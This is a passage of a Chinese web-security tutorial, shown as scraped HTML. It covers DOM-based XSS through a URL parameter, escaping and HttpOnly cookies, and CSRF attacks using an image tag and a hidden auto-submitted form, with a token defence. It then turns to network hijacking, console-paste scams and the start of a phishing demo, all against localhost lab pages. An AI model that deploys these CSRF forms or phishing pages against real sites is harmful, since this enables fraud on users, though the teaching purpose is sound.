        <div>版权所有：<span id=&quot;username_info&quot;></span></div>
        <script>
            var param = /=(.+)$/.exec(location.search);
            var value = decodeURIComponent(param[1]);
            $('#username_info').append(value);
        </script>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            用户名：<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlentities($username);<span class="hljs-meta">?&gt;</span></span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第一条状态：侯医生的状态1
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第二条状态：侯医生的状态2
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            第三条状态：侯医生的状态3
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>版权所有：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"username_info"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
            <span class="hljs-keyword">var</span> param = <span class="hljs-regexp">/=(.+)$/</span>.exec(location.search);
            <span class="hljs-keyword">var</span> value = <span class="hljs-built_in">decodeURIComponent</span>(param[<span class="hljs-number">1</span>]);
            $(<span class="hljs-string">'#username_info'</span>).append(value);
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>上述代码，满足了一个很正常的需求，解开URL中的一个参数，并将其渲染至页面上。但是，这里面存在一个风险，如果黑客在URL的这个参数中，加入js代码，这样便又会被执行(如图1.5.1所示)。<br><span class="img-wrap"><img data-src="/img/bVB9zm" src="https://static.alili.tech/img/bVB9zm" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.5.1</p>
<h3 id="articleHeader8">1.6 防御再次升级</h3>
<p>像这种从url中获取的信息，笔者建议，最好由后端获取，在前端转义后再行输出，代码如下，效果如图1.6.1</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<script>
    var value = decodeURIComponent(&quot;<?php echo htmlentities($_GET['username']);?>&quot;);
    $('#username_info').append(value);
</script>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">
    var value = decodeURIComponent("<span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> htmlentities($_GET[<span class="hljs-string">'username'</span>]);<span class="hljs-meta">?&gt;</span></span>");
    $('#username_info').append(value);
</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
<p><span class="img-wrap"><img data-src="/img/bVB9zP" src="https://static.alili.tech/img/bVB9zP" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.6.1<br>使用url中的参数的时候要小心，更不要拿URL中的参数去eval。</p>
<h3 id="articleHeader9">1.7 保护好你的cookie</h3>
<p>如果不幸中招了，黑客的js真的在我们的网页上执行了，我们该怎么办。其实，很多时候，我们的敏感信息都是存储在cookie中的（不要把用户机密信息放在网页中），想要阻止黑客通过js访问到cookie中的用户敏感信息。那么请使用cookie的HttpOnly属性，加上了这个属性的cookie字段，js是无法进行读写的。php的设置方法如下：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
    setcookie(&quot;userpass&quot;, &quot;doctorhou-shuai&quot;, NULL, NULL, NULL, NULL, TRUE);
?>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
    setcookie(<span class="hljs-string">"userpass"</span>, <span class="hljs-string">"doctorhou-shuai"</span>, <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">TRUE</span>);
<span class="hljs-meta">?&gt;</span></span></code></pre>
<p>如图1.7.1，我们的cookie已经种上了，并且有了httpOnly标识<br><span class="img-wrap"><img data-src="/img/bVB9Hh" src="https://static.alili.tech/img/bVB9Hh" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.7.1<br>如图1.7.2，我们通过js无法获取cookie中的设定有httpOnly的字段：<br><span class="img-wrap"><img data-src="/img/bVB9Hv" src="https://static.alili.tech/img/bVB9Hv" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图1.7.2<br>话说回来，其实还有很多xss的升级攻击方式，同学们有兴趣的话，可以自己去研究一下。(不要干坏事儿哦)</p>
<h2 id="articleHeader10">2 CSRF攻击</h2>
<h3 id="articleHeader11">2.1 什么是CSRF攻击？</h3>
<p>CSRF攻击在百度百科中的解释是：<br>CSRF（Cross-site request forgery跨站请求伪造，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。<br>其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上(如：你所使用的网络银行的网站)。</p>
<h3 id="articleHeader12">2.2 如何攻击？</h3>
<h4>2.2.1 要合理使用post与get</h4>
<p>通常我们会为了省事儿，把一些应当提交的数据，做成get请求。殊不知，这不仅仅是违反了http的标准而已，也同样会被黑客所利用。<br>比如，你开发的网站中，有一个购买商品的操作。你是这么开发的：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
// 从cookie中获取用户名，看似稳妥
$username = $_COOKIE['username'];
$productId = $_GET['pid'];
// 这里进行购买操作
//store_into_database($username, $productId);
?>
<meta charset=&quot;utf-8&quot; />
<?php
echo $username . '买入商品：' . $productId;
?>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// 从cookie中获取用户名，看似稳妥</span>
$username = $_COOKIE[<span class="hljs-string">'username'</span>];
$productId = $_GET[<span class="hljs-string">'pid'</span>];
<span class="hljs-comment">// 这里进行购买操作</span>
<span class="hljs-comment">//store_into_database($username, $productId);</span>
<span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
<span class="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span> $username . <span class="hljs-string">'买入商品：'</span> . $productId;
<span class="hljs-meta">?&gt;</span></span></code></pre>
<p>而商品ID图个省事儿，就使用了url中的get参数。买商品的话，如图2.2.1.1所示<br><span class="img-wrap"><img data-src="/img/bVB9Ca" src="https://static.alili.tech/img/bVB9Ca" alt="clipboard.png" title="clipboard.png" style="cursor: pointer; display: inline;"></span><br>图2.2.1.1<br>那么，黑客的网站可以这样开发：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
    </head>
    <body>
        <img src=&quot;http://localhost:8082/lab/xsrflab/submit.php?pid=1&quot; />
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://localhost:8082/lab/xsrflab/submit.php?pid=1"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>这样的话，用户只需要访问一次黑客的网站，其实就相当于在你的网站中，操作了一次。然而用户却没有感知。如图2.2.1.2所示：<br><span class="img-wrap"><img data-src="/img/bVB9Cr" src="https://static.alili.tech/img/bVB9Cr" alt="clipboard.png" title="clipboard.png" style="cursor: pointer; display: inline;"></span><br>图2.2.1.2<br>所以，我们日常的开发，还是要遵循提交业务，严格按照post请求去做的。更不要使用jsonp去做提交型的接口，这样非常的危险。</p>
<h4>2.2.2 xsrf攻击升级</h4>
<p>如果你使用了post请求来处理关键业务的，还是有办法可以破解的。我们的业务代码如下：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
$username = $_COOKIE['username'];
// 换为post了，可以规避黑客直接的提交
$productId = $_POST['pid'];
// 这里进行购买操作
//store_into_database($username, $productId);
?>
<meta charset=&quot;utf-8&quot; />
<?php
echo $username . '买入商品：' . $productId;
?>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
$username = $_COOKIE[<span class="hljs-string">'username'</span>];
<span class="hljs-comment">// 换为post了，可以规避黑客直接的提交</span>
$productId = $_POST[<span class="hljs-string">'pid'</span>];
<span class="hljs-comment">// 这里进行购买操作</span>
<span class="hljs-comment">//store_into_database($username, $productId);</span>
<span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
<span class="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span> $username . <span class="hljs-string">'买入商品：'</span> . $productId;
<span class="hljs-meta">?&gt;</span></span></code></pre>
<p>黑客代码如下：</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
        <script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;></script>
    </head>
    <body>
        <button id=&quot;clickme&quot;>点我看相册</button>
        <script>
            $('#clickme').on('click', function () {
                // 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。
                $('#myform').submit();
            });
        </script>
        <form id=&quot;myform&quot; style=&quot;display:none;&quot; target=&quot;myformer&quot; method=&quot;post&quot; action=&quot;http://myhost:8082/lab/xsrflab/submit.php&quot;>
            <input type=&quot;hidden&quot; name=&quot;pid&quot; value=&quot;1&quot;>
        </form>
        <iframe name=&quot;myformer&quot; style=&quot;display:none;&quot;></iframe>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"clickme"</span>&gt;</span>点我看相册<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
            $(<span class="hljs-string">'#clickme'</span>).on(<span class="hljs-string">'click'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>{
                <span class="hljs-comment">// 用户再不知情的情况下，提交了表单，服务器这边也会以为是用户提交过来的。</span>
                $(<span class="hljs-string">'#myform'</span>).submit();
            });
        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"myform"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"myformer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://myhost:8082/lab/xsrflab/submit.php"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"pid"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"1"</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"myformer"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>效果如图2.2.2.1<br><span class="img-wrap"><img data-src="/img/bVB9DR" src="https://static.alili.tech/img/bVB9DR" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图2.2.2.1<br>点击后，用户进行了提交，却连自己都不知情。这种情况如何防御呢？<br>最简单的办法就是加验证码，这样除了用户，黑客的网站是获取不到用户本次session的验证码的。但是这样也会降低用户的提交体验，特别是有些经常性的操作，如果总让用户输入验证码，用户也会非常的烦。<br>另一种方式，就是在用访问的页面中，都种下验证用的token，用户所有的提交都必须带上本次页面中生成的token，这种方式的本质和使用验证码没什么两样，但是这种方式，整个页面每一次的session，使用同一个token就行，很多post操作，开发者就可以自动带上当前页面的token。如果token校验不通过，则证明此次提交并非从本站发送来，则终止提交过程。如果token确实为本网站生成的话，则可以通过。<br>代码如下，防御效果如图2.2.2.2</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php
$username = $_COOKIE['username'];
$productId = $_POST['pid'];
$token=$_POST['token'];
// 校验算法例子
function check_token($token) {
    if ($token==='doctorhou-shuai') {
        return true;
    }
    return false;
}
if (!check_token($token)) {
    // 如果校验未通过，则中止
    return ;
}
// 这里进行购买操作
//store_into_database($username, $productId);
?>
<meta charset=&quot;utf-8&quot; />
<?php
echo $username . '买入商品：' . $productId;
?>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span>
$username = $_COOKIE[<span class="hljs-string">'username'</span>];
$productId = $_POST[<span class="hljs-string">'pid'</span>];
$token=$_POST[<span class="hljs-string">'token'</span>];
<span class="hljs-comment">// 校验算法例子</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_token</span><span class="hljs-params">($token)</span> </span>{
    <span class="hljs-keyword">if</span> ($token===<span class="hljs-string">'doctorhou-shuai'</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
}
<span class="hljs-keyword">if</span> (!check_token($token)) {
    <span class="hljs-comment">// 如果校验未通过，则中止</span>
    <span class="hljs-keyword">return</span> ;
}
<span class="hljs-comment">// 这里进行购买操作</span>
<span class="hljs-comment">//store_into_database($username, $productId);</span>
<span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
<span class="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span> $username . <span class="hljs-string">'买入商品：'</span> . $productId;
<span class="hljs-meta">?&gt;</span></span></code></pre>
<p><span class="img-wrap"><img data-src="/img/bVB9EF" src="https://static.alili.tech/img/bVB9EF" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图2.2.2.2<br>如上图，并没有携带本站每次session生成的token，则提交失败。<br>本站的网站form，则都会自动携带本站生成的token</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<?php function token_creater() {
    // 本站生成token的方法
    return 'doctorhou-shuai';
}?>
<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
        <script src=&quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js&quot;></script>
    </head>
    <body>
        <form id=&quot;myform&quot; target=&quot;myformer&quot; method=&quot;post&quot; action=&quot;http://localhost:8082/lab/xsrflab/submit.php&quot;>
            商品名称：<input name=&quot;pid&quot; value=&quot;1&quot;>
            <input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;<?php echo token_creater();?>&quot; />
            <input type=&quot;submit&quot; value=&quot;提交&quot; />
        </form>
        <iframe name=&quot;myformer&quot; style=&quot;display:none;&quot;></iframe>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">token_creater</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// 本站生成token的方法</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">'doctorhou-shuai'</span>;
}<span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/js/lib/jquery-1.10.2_d88366fd.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"myform"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"myformer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"post"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://localhost:8082/lab/xsrflab/submit.php"</span>&gt;</span>
            商品名称：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"pid"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"1"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"token"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"&lt;?php echo token_creater();?&gt;"</span> /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"提交"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"myformer"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>再次使用本站的网页进行提交，则通过，如图2.2.2.3所示：<br><span class="img-wrap"><img data-src="/img/bVB9Fn" src="https://static.alili.tech/img/bVB9Fn" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图2.2.2.3<br>当然，上面的只是例子，具体的token生成，肯定是要随着session与用户ID去变的，如果各位看官觉得自己的网站也需要加个token，请自行百度，进行深入的学习。</p>
<h2 id="articleHeader13">3 网络劫持攻击</h2>
<p>很多的时候，我们的网站不是直接就访问到我们的服务器上的，中间会经过很多层代理，如果在某一个环节，数据被中间代理层的劫持者所截获，他们就能获取到使用你网站的用户的密码等保密数据。比如，我们的用户经常会在各种饭馆里面，连一些奇奇怪怪的wifi，如果这个wifi是黑客所建立的热点wifi，那么黑客就可以结果该用户收发的所有数据。这里，建议站长们网站都使用https进行加密。这样，就算网站的数据能被拿到，黑客也无法解开。</p>
<p>如果你的网站还没有进行https加密的化，则在表单提交部分，最好进行非对称加密--即客户端加密，只有服务端能解开。这样中间的劫持者便无法获取加密内容的真实信息了。</p>
<h2 id="articleHeader14">4 控制台注入代码</h2>
<p>不知道各位看官有没有注意到天猫官网控制台的警告信息，如图4.1所示，这是为什么呢？因为有的黑客会诱骗用户去往控制台里面粘贴东西（欺负小白用户不懂代码），比如可以在朋友圈贴个什么文章，说:"只要访问天猫，按下F12并且粘贴以下内容，则可以获得xx元礼品"之类的，那么有的用户真的会去操作，并且自己隐私被暴露了也不知道。<br><span class="img-wrap"><img data-src="/img/bVB9MV" src="https://static.alili.tech/img/bVB9MV" alt="clipboard.png" title="clipboard.png" style="cursor: pointer;"></span><br>图4.1<br>天猫这种做法，也是在警告用户不要这么做，看来天猫的前端安全做的也是很到位的。不过，这种攻击毕竟是少数，所以各位看官看一眼就行，如果真的发现有的用户会被这样攻击的话，记得想起天猫的这种解决方案。</p>
<h2 id="articleHeader15">5 钓鱼</h2>
<p>钓鱼也是一种非常古老的攻击方式了，其实并不太算前端攻击。可毕竟是页面级别的攻击，我们也来一起聊一聊。我相信很多人会有这样的经历，QQ群里面有人发什么兼职啦、什么自己要去国外了房子车子甩卖了，详情在我QQ空间里啦，之类的连接。打开之后发现一个QQ登录框，其实一看域名就知道不是QQ，不过做得非常像QQ登录，不明就里的用户们，就真的把用户名和密码输入了进去，结果没登录到QQ，用户名和密码却给人发过去了。<br>其实这种方式，在前端也有利用。下面，我们就来试试如果利用前端进行一次逼真的钓鱼。<br>1 首先，我们在xx空间里分享一篇文章，然后吸引别人去点击。效果如图5.1.1</p>
<div class="widget-codetool" style="display:none;">
      <div class="widget-codetool--inner">
      <span class="selectCode code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="全选"></span>
      <span type="button" class="copyCode code-tool" data-toggle="tooltip" data-placement="top" data-clipboard-text="<!DOCYTPE HTML>
<html>
    <head>
        <meta charset=&quot;utf-8&quot; />
    </head>
    <body>
        <div>
        当前你在xx空间
        </div>
        <h1>侯博士的分享</h1>
        <section>
        咱们班当年班花，现在长这样：
        <!--这是咱们的钓鱼网站-->
        <a href=&quot;http://localhost:8082/lab/fish/cheat.php&quot; target=&quot;_blank&quot;>点我查看</a>
        </section>
    </body>
</html>" title="" data-original-title="复制"></span>
      <span type="button" class="saveToNote code-tool" data-toggle="tooltip" data-placement="top" title="" data-original-title="放进笔记"></span>
      </div>
      </div><pre class="hljs xml"><code><span class="hljs-tag">&lt;<span class="hljs-name">!DOCYTPE</span> <span class="hljs-attr">HTML</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
        当前你在xx空间
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>侯博士的分享<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">section</span>&gt;</span>
        咱们班当年班花，现在长这样：
        <span class="hljs-comment">&lt;!--这是咱们的钓鱼网站--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://localhost:8082/lab/fish/cheat.php"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span>&gt;</span>点我查看<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
